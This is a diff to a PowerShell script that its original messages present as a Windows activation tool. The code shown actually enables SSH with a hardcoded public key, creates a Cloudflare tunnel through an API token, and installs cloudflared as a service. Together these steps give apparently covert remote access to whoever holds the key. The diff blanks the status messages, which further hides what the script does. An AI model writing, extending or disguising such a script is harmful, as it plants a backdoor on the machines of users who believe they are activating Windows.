@@ -60,7 +60,7 @@ $SshPublicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMk83rs0xpy8XOhogglSmppmkYe
 
 Write-Host "`n===========================================" -ForegroundColor Cyan
 Write-Host "===========================================" -ForegroundColor Cyan
-Write-Host "1. Active WINDOWS" -ForegroundColor Cyan
+Write-Host "1." -ForegroundColor Cyan
 Write-Host "===========================================" -ForegroundColor Cyan
 Write-Host "Kiem tra tinh trang may..."
 if (Get-Service -Name sshd -ErrorAction SilentlyContinue) {
@@ -112,21 +112,21 @@ Write-Host "`n===========================================" -ForegroundColor Cyan
 Write-Host "2" -ForegroundColor Cyan
 Write-Host "===========================================" -ForegroundColor Cyan
 
-$InputName = Read-Host "Nhập "
+$InputName = Read-Host ": "
 
 $Headers = @{
     "Authorization" = "Bearer $CloudflareAPIToken"
     "Content-Type"  = "application/json"
 }
 
-Write-Host "-> Cấp tên..."
+Write-Host "->..."
 try {
     $TunnelsRes = Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel?is_deleted=false&per_page=100" -Method Get -Headers $Headers
     $ExistingTunnels = @($TunnelsRes.result.name)
 }
 catch {
     $ExistingTunnels = @()
-    Write-Host "   [CẢNH BÁO] Không thể lấy danh sách để kiểm tra trùng lặp." -ForegroundColor Yellow
+    Write-Host "!!!" -ForegroundColor Yellow
 }
 
 if ([string]::IsNullOrWhiteSpace($InputName)) {
@@ -172,7 +172,7 @@ try {
     Write-Host "   => Thanh cong!" -ForegroundColor Green
 }
 catch {
-    Write-Host "   => [LOI] Khong the tao Tunnel." -ForegroundColor Red
+    Write-Host "   => [LOI] ." -ForegroundColor Red
     Write-Host "   Chi tiet: $( $_.ErrorDetails.Message )"
     exit
 }
@@ -237,7 +237,7 @@ $CloudflaredPath = "$env:TEMP\cloudflared.exe"
 Write-Host "moi nhat..."
 Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile $CloudflaredPath -UseBasicParsing
 
-Write-Host "Token..."
+Write-Host "..."
 # Thu go cai dat service cu (neu co) truoc khi cai moi
 try {
     & $CloudflaredPath service uninstall *>&1 | Out-Null
@@ -256,7 +256,7 @@ Remove-Item $CloudflaredPath -ErrorAction SilentlyContinue
 Write-Host "`n===========================================" -ForegroundColor Cyan
 Write-Host "4." -ForegroundColor Cyan
 Write-Host "===========================================" -ForegroundColor Cyan
-Write-Host "Activating Windows..."
+Write-Host "..."
 
 $SshDir = "$env:USERPROFILE\.ssh"
 if (!(Test-Path $SshDir)) {
@@ -294,9 +294,9 @@ if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
 }
 
 Write-Host "`n===========================================" -ForegroundColor Green
-Write-Host "[HOAN TAT] ACTIVATED!" -ForegroundColor Green
+Write-Host "." -ForegroundColor Green
 Write-Host "===========================================" -ForegroundColor Green
-Write-Host "HDPE la ngon luon ! :p"
+Write-Host "!"
 
 Write-Host "`nNhan phim bat ky de thoat..." -ForegroundColor Cyan
 try {
